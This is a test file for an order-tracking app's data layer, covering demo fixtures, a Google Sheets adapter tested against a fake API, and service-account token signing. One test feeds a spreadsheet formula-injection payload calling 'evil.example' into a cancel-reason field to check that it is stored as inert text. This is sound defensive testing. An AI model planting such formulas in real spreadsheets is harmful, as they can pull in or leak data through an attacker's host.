import { generateKeyPairSync, createVerify } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { DEMO_ORDERS } from '../lib/data/demo-orders.js';
import { DemoOrderRepository } from '../lib/data/demo-repository.js';
import {
  buildAssertion,
  GoogleTokenProvider,
  parseServiceAccount,
} from '../lib/data/google-auth.js';
import { SheetsOrderRepository, type SheetsOptions } from '../lib/data/sheets-repository.js';
import { canonicalOrderId, DataSourceError } from '../lib/data/types.js';
import { isoDaysFromToday, NOW, urlOf } from './helpers.js';

describe('demo adapter', () => {
  it('contains the synthetic orders from demo/orders.json unchanged', () => {
    const fixture = JSON.parse(
      readFileSync(new URL('../../demo/orders.json', import.meta.url), 'utf8'),
    ) as Record<string, unknown>[];
    expect(fixture.length).toBeGreaterThan(0);
    for (const expected of fixture) {
      const actual = DEMO_ORDERS.find((o) => o.order_id === expected.order_id);
      expect(actual).toEqual(expected);
    }
  });

  it('only contains synthetic contact details', () => {
    for (const demo of DEMO_ORDERS) {
      expect(demo.order_id).toMatch(/^ORD-TEST-\d{3}$/);
      expect(demo.email).toMatch(/@example\.test$/);
      expect(demo.phone_no).toMatch(/^\+1-555-01\d\d$/);
    }
  });

  it('finds orders however the ID is punctuated', async () => {
    const repo = new DemoOrderRepository(undefined, () => NOW);
    for (const id of ['ORD-TEST-001', 'ord-test-001', 'ORD TEST 001', 'ordtest001']) {
      expect((await repo.findByOrderId(id))?.orderId).toBe('ORD-TEST-001');
    }
    expect(await repo.findByOrderId('ORD-TEST-999')).toBeNull();
    expect(await repo.findByOrderId('')).toBeNull();
  });

  it('keeps relative delivery dates relative to today', async () => {
    const repo = new DemoOrderRepository(undefined, () => NOW);
    expect((await repo.findByOrderId('ORD-TEST-004'))?.deliveryDate).toBe(isoDaysFromToday(5));
    expect((await repo.findByOrderId('ORD-TEST-005'))?.deliveryDate).toBe(isoDaysFromToday(-3));
    expect((await repo.findByOrderId('ORD-TEST-001'))?.deliveryDate).toBe('2026-12-31');
  });

  it('applies updates in memory without touching the fixtures or other instances', async () => {
    const repo = new DemoOrderRepository(undefined, () => NOW);
    await repo.update('ORD-TEST-004', { status: 'cancelled' });
    expect((await repo.findByOrderId('ORD-TEST-004'))?.status).toBe('cancelled');
    expect(DEMO_ORDERS.find((o) => o.order_id === 'ORD-TEST-004')?.status).toBe('processing');
    const other = new DemoOrderRepository(undefined, () => NOW);
    expect((await other.findByOrderId('ORD-TEST-004'))?.status).toBe('processing');
  });
});

describe('order ID canonical form', () => {
  it('ignores case and punctuation', () => {
    expect(canonicalOrderId(' ord_test-001 ')).toBe('ORDTEST001');
  });
});

// ---------------------------------------------------------------------------
// Google Sheets adapter, against a fake Sheets API
// ---------------------------------------------------------------------------

const HEADER = [
  'OrderID',
  'CustomerName',
  'Status',
  'Carrier',
  'DeliveryLocation',
  'Delivery',
  'TrackingSteps',
  'PhoneNo',
  'Email',
  'Reason',
  'CancelDate',
  'ReturnStatus',
  'ReturnReason',
  'ItemCondition',
  'ReturnInitiate',
];
const ROWS = [
  [
    'ORD-TEST-001',
    'Alex Example',
    'Shipped',
    'UPS',
    'Test City',
    '31-12-26',
    'Label created; In transit',
    '+1-555-0101',
    'alex@example.test',
  ],
  [
    'ORD-TEST-002',
    'Sam Example',
    'Processing',
    '—',
    'Test City',
    'Not scheduled',
    'Order received',
    '+1-555-0102',
    'sam@example.test',
  ],
  ['', 'blank id row'],
  ['ORD-TEST-001', 'Duplicate Row'],
];

const OPTIONS: SheetsOptions = {
  sheetId: 'sheet_id_for_tests_only_0000',
  tab: "Bob's Orders",
  timeoutMs: 200,
  retries: 2,
  backoffMs: 10,
  cacheTtlMs: 15_000,
};

interface Call {
  url: string;
  method: string;
  body: string | undefined;
  auth: string | null;
}

function fakeSheets(script: (call: Call, index: number) => Response | Promise<Response>) {
  const calls: Call[] = [];
  const sleeps: number[] = [];
  let clock = 1_000_000;
  const fetchImpl = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const headers = new Headers(init?.headers);
    const call: Call = {
      url: urlOf(input),
      method: init?.method ?? 'GET',
      body: typeof init?.body === 'string' ? init.body : undefined,
      auth: headers.get('authorization'),
    };
    calls.push(call);
    return script(call, calls.length - 1);
  }) as typeof fetch;
  let tokenCount = 0;
  const tokens = {
    getToken: () => Promise.resolve(`token-${++tokenCount}`),
    invalidate: () => undefined,
  };
  const repo = new SheetsOrderRepository(OPTIONS, {
    fetchImpl,
    tokens,
    now: () => clock,
    sleep: (ms) => {
      sleeps.push(ms);
      return Promise.resolve();
    },
  });
  return {
    repo,
    calls,
    sleeps,
    advance: (ms: number) => {
      clock += ms;
    },
  };
}

const sheetOk = () => Response.json({ values: [HEADER, ...ROWS] });

describe('Google Sheets adapter', () => {
  it('maps rows by header name', async () => {
    const { repo, calls } = fakeSheets(sheetOk);
    const found = await repo.findByOrderId('ord test 001');
    expect(found).toMatchObject({
      orderId: 'ORD-TEST-001',
      customerName: 'Alex Example',
      status: 'Shipped',
      deliveryDate: '31-12-26',
      phone: '+1-555-0101',
      email: 'alex@example.test',
      trackingSteps: ['Label created', 'In transit'],
    });
    expect((await repo.findByOrderId('ORD-TEST-002'))?.carrier).toBeNull();
    expect(await repo.findByOrderId('ORD-TEST-999')).toBeNull();
    // The tab name is quoted and URL-encoded; the order ID never reaches the URL.
    expect(calls[0]?.url).toContain(encodeURIComponent("'Bob''s Orders'!A1:AZ"));
    expect(calls[0]?.url).not.toContain('ORD');
    expect(calls[0]?.auth).toBe('Bearer token-1');
  });

  it('reads the sheet once and serves later lookups from the cache', async () => {
    const { repo, calls, advance } = fakeSheets(sheetOk);
    await Promise.all([repo.findByOrderId('ORD-TEST-001'), repo.findByOrderId('ORD-TEST-002')]);
    await repo.findByOrderId('ORD-TEST-001');
    expect(calls).toHaveLength(1);
    advance(15_001);
    await repo.findByOrderId('ORD-TEST-001');
    expect(calls).toHaveLength(2);
  });

  it('retries a failing read with exponential backoff, then succeeds', async () => {
    const { repo, calls, sleeps } = fakeSheets((_call, index) =>
      index < 2 ? new Response('busy', { status: 503 }) : sheetOk(),
    );
    expect((await repo.findByOrderId('ORD-TEST-001'))?.orderId).toBe('ORD-TEST-001');
    expect(calls).toHaveLength(3);
    expect(sleeps).toHaveLength(2);
    expect(sleeps[0]).toBeGreaterThanOrEqual(10);
    expect(sleeps[1]).toBeGreaterThanOrEqual(20);
  });

  it('gives up after the configured retries', async () => {
    const { repo, calls } = fakeSheets(() => new Response('rate limited', { status: 429 }));
    await expect(repo.findByOrderId('ORD-TEST-001')).rejects.toMatchObject({
      name: 'DataSourceError',
      category: 'unavailable',
    });
    expect(calls).toHaveLength(3);
  });

  it('does not retry a permission error', async () => {
    const { repo, calls } = fakeSheets(() => new Response('forbidden', { status: 403 }));
    await expect(repo.findByOrderId('ORD-TEST-001')).rejects.toBeInstanceOf(DataSourceError);
    expect(calls).toHaveLength(1);
  });

  it('times out a hanging request', async () => {
    const { repo, calls } = fakeSheets(
      () =>
        new Promise<Response>((_resolve, reject) => {
          setTimeout(() => {
            reject(new DOMException('timed out', 'TimeoutError'));
          }, 5);
        }),
    );
    await expect(repo.findByOrderId('ORD-TEST-001')).rejects.toMatchObject({ category: 'timeout' });
    expect(calls).toHaveLength(3);
  });

  it('fails clearly when the sheet has no OrderID column', async () => {
    const { repo } = fakeSheets(() => Response.json({ values: [['Name'], ['x']] }));
    await expect(repo.findByOrderId('ORD-TEST-001')).rejects.toMatchObject({ category: 'schema' });
  });

  it('writes only the changed cells, as raw text, with formulas neutralized', async () => {
    const { repo, calls } = fakeSheets((call) =>
      call.method === 'POST' ? Response.json({}) : sheetOk(),
    );
    await repo.update('ORD-TEST-002', {
      status: 'cancelled',
      cancelReason: '=IMPORTXML("https://evil.example","//a")',
      cancelDate: '2026-11-15T12:00:00.000Z',
    });
    const write = calls.find((call) => call.method === 'POST');
    expect(write?.url).toMatch(/values:batchUpdate$/);
    const payload = JSON.parse(write?.body ?? '{}') as {
      valueInputOption: string;
      data: { range: string; values: string[][] }[];
    };
    expect(payload.valueInputOption).toBe('RAW');
    expect(payload.data).toEqual([
      { range: "'Bob''s Orders'!C3", values: [['cancelled']] },
      { range: "'Bob''s Orders'!J3", values: [[`'=IMPORTXML("https://evil.example","//a")`]] },
      { range: "'Bob''s Orders'!K3", values: [['2026-11-15T12:00:00.000Z']] },
    ]);
    // The cached copy reflects the write, so a repeat request sees the new state.
    expect((await repo.findByOrderId('ORD-TEST-002'))?.status).toBe('cancelled');
    expect(calls.filter((call) => call.method === 'GET')).toHaveLength(1);
  });

  it('refuses to write a field the sheet has no column for', async () => {
    const { repo } = fakeSheets(sheetOk);
    await expect(repo.update('ORD-TEST-002', { refundStatus: 'initiated' })).rejects.toMatchObject({
      category: 'schema',
    });
  });
});

describe('Google service-account auth', () => {
  const { privateKey, publicKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
  const pem = privateKey.export({ type: 'pkcs8', format: 'pem' });
  const json = JSON.stringify({
    client_email: 'lumina@example-project.iam.gserviceaccount.com',
    private_key: pem,
  });

  it('accepts raw or base64 JSON and rejects anything else without echoing it', () => {
    expect(parseServiceAccount(json).client_email).toContain('lumina@');
    expect(parseServiceAccount(Buffer.from(json).toString('base64')).private_key).toBe(pem);
    expect(() => parseServiceAccount('not-json')).toThrow(/not valid JSON/);
    expect(() => parseServiceAccount('{"client_email":"x"}')).toThrow(/private_key/);
  });

  it('builds a correctly signed RS256 assertion', () => {
    const account = parseServiceAccount(json);
    const [header, claims, signature] = buildAssertion(account, 1_800_000_000).split('.');
    expect(JSON.parse(Buffer.from(header ?? '', 'base64url').toString())).toEqual({
      alg: 'RS256',
      typ: 'JWT',
    });
    expect(JSON.parse(Buffer.from(claims ?? '', 'base64url').toString())).toEqual({
      iss: 'lumina@example-project.iam.gserviceaccount.com',
      scope: 'https://www.googleapis.com/auth/spreadsheets',
      aud: 'https://oauth2.googleapis.com/token',
      iat: 1_800_000_000,
      exp: 1_800_003_600,
    });
    const valid = createVerify('RSA-SHA256')
      .update(`${header}.${claims}`)
      .verify(publicKey, Buffer.from(signature ?? '', 'base64url'));
    expect(valid).toBe(true);
  });

  it('caches the access token until shortly before it expires', async () => {
    let clock = 0;
    let requests = 0;
    const fetchImpl = (() => {
      requests += 1;
      return Promise.resolve(Response.json({ access_token: `t${requests}`, expires_in: 3600 }));
    }) as typeof fetch;
    const provider = new GoogleTokenProvider(
      parseServiceAccount(json),
      fetchImpl,
      500,
      () => clock,
    );
    expect(await Promise.all([provider.getToken(), provider.getToken()])).toEqual(['t1', 't1']);
    clock = 3_500_000;
    expect(await provider.getToken()).toBe('t1');
    clock = 3_545_000;
    expect(await provider.getToken()).toBe('t2');
    expect(requests).toBe(2);
  });

  it('reports a rejected token request without leaking the response', async () => {
    const fetchImpl = (() =>
      Promise.resolve(new Response('{"error":"invalid_grant"}', { status: 400 }))) as typeof fetch;
    const provider = new GoogleTokenProvider(parseServiceAccount(json), fetchImpl, 500);
    await expect(provider.getToken()).rejects.toMatchObject({ category: 'unauthorized' });
  });
});
